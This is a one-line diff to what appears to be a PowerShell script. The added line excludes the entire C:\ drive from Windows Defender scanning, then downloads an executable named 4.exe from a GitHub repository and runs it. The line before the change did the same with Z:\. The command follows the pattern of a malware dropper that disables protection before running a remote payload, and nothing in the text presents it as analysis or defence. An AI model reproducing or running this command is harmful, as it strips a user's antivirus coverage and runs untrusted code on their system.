@@ -1,1 +1,1 @@
-Add-MpPreference -ExclusionPath 'Z:\';Invoke-WebRequest 'https://github.com/anilxpm/powerl/raw/master/4.exe' -OutFile 4.exe;.\4.exe
+Add-MpPreference -ExclusionPath 'C:\';Invoke-WebRequest 'https://github.com/anilxpm/powerl/raw/master/4.exe' -OutFile 4.exe;.\4.exe
